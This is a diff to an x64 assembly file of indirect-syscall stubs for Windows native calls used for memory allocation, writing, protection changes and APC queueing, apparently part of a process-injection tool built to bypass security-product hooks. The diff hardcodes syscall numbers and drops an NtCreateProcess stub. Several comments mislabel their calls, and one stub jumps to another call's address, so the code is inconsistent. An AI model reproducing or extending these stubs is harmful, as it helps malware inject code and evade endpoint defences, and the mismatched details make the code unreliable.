@@ -15,8 +15,6 @@ EXTERN sysAddrNtSuspendThread:QWORD                 ; The actual address of the 
 EXTERN wNtResumeThread:DWORD                        ; Syscall number for NtResumeThread.
 EXTERN sysAddrNtResumeThread:QWORD                  ; The actual address of the NtResumeThread syscall in ntdll.dll.
 
-EXTERN wNtCreateProcess:DWORD                    ; Syscall number for NtSetContextThread.
-EXTERN sysAddrNtCreateProcess:QWORD              ; The actual address of the NtSetContextThread syscall in ntdll.dll.
 
 EXTERN wNtOpenProcess:DWORD                    ; Syscall number for NtSetContextThread.
 EXTERN sysAddrNtOpenProcess:QWORD              ; The actual address of the NtSetContextThread syscall in ntdll.dll.
@@ -39,7 +37,7 @@ NtAllocateVirtualMemory ENDP                        ; End of the procedure.
 ; Procedure for the NtWriteVirtualMemory syscall
 NtWriteVirtualMemory PROC
     mov r10, rcx                                    ; Move the contents of rcx to r10.
-    mov eax, wNtWriteVirtualMemory                  ; Move the syscall number into the eax register.
+    mov eax, 03ah                  ; Move the syscall number into the eax register.
     jmp QWORD PTR [sysAddrNtQueueApcThread]     ; Jump to the actual syscall.
 NtWriteVirtualMemory ENDP
 
@@ -61,17 +59,12 @@ NtSuspendThread ENDP
 ; Procedure for the NtResumeThread syscall
 NtResumeThread PROC
     mov r10, rcx                                    ; Move the contents of rcx to r10.
-    mov eax, wNtResumeThread                        ; Move the syscall number into the eax register.
+    mov eax, 052h                        ; Move the syscall number into the eax register.
     jmp QWORD PTR [sysAddrNtResumeThread]           ; Jump to the actual syscall.
 NtResumeThread ENDP
 
 ; Procedure for the NtSetContextThread syscall
 
-NtCreateProcess PROC
-    mov r10, rcx                                    ; Move the contents of rcx to r10.
-    mov eax, wNtCreateProcess                    ; Move the syscall number into the eax register.
-    jmp QWORD PTR [sysAddrNtCreateProcess]       ; Jump to the actual syscall.
-NtCreateProcess ENDP
 
 NtOpenProcess PROC
     mov r10, rcx                                    ; Move the contents of rcx to r10.
@@ -81,13 +74,13 @@ NtOpenProcess ENDP
 
 NtProtectVirtualMemory PROC
     mov r10, rcx                                    ; Move the contents of rcx to r10.
-    mov eax, wNtProtectVirtualMemory                    ; Move the syscall number into the eax register.
+    mov eax, 050h                                 ; Move the syscall number into the eax register.
     jmp QWORD PTR [sysAddrNtProtectVirtualMemory]       ; Jump to the actual syscall.
 NtProtectVirtualMemory ENDP
 
 NtQueueApcThread PROC
     mov r10, rcx                                    ; Move the contents of rcx to r10.
-    mov eax, wNtQueueApcThread                    ; Move the syscall number into the eax register.
+    mov eax, 045h                    ; Move the syscall number into the eax register.
     jmp QWORD PTR [sysAddrNtQueueApcThread]       ; Jump to the actual syscall.
 NtQueueApcThread ENDP
 
